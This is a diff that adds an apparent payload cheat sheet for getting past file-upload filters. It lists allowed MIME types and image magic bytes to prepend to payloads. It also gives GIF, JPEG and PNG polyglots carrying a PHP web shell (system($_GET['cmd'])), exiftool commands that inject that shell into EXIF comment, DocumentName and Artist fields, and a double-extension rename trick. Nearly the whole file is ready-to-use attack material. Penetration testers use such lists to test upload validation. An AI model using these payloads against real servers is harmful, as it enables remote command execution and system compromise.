@@ -1,0 +1,59 @@
+# Content-Type Bypass
+
+# ============ Image MIME types ============
+image/jpeg
+image/png
+image/gif
+image/webp
+image/svg+xml
+image/bmp
+image/tiff
+image/x-icon
+
+# ============ Other allowed types ============
+text/plain
+application/octet-stream
+application/pdf
+application/zip
+
+# ============ Magic bytes (file signatures) ============
+# Add these at the beginning of your payload
+
+# GIF
+GIF87a
+GIF89a
+# Then your PHP code: GIF89a<?php system($_GET['c']); ?>
+
+# JPEG
+\xFF\xD8\xFF\xE0
+# Hex: FFD8FFE0
+
+# PNG
+\x89PNG\r\n\x1A\n
+# Hex: 89504E470D0A1A0A
+
+# BMP
+BM
+
+# PDF
+%PDF-1.4
+
+# ============ Polyglot examples ============
+
+# GIF + PHP
+GIF89a<?php system($_GET['cmd']); ?>
+
+# PNG + PHP (requires proper chunk structure)
+# Use exiftool: exiftool -Comment='<?php system($_GET["c"]); ?>' image.png
+
+# JPEG + PHP
+\xFF\xD8\xFF\xE0\x00\x10JFIF<?php system($_GET['c']); ?>
+
+# ============ Exiftool injection ============
+# Inject PHP in EXIF comment
+exiftool -Comment='<?php system($_GET["c"]); ?>' image.jpg
+# Then rename: mv image.jpg image.php.jpg
+
+# Inject in other fields
+exiftool -DocumentName='<?php system($_GET["c"]); ?>' image.jpg
+exiftool -Artist='<?php system($_GET["c"]); ?>' image.jpg
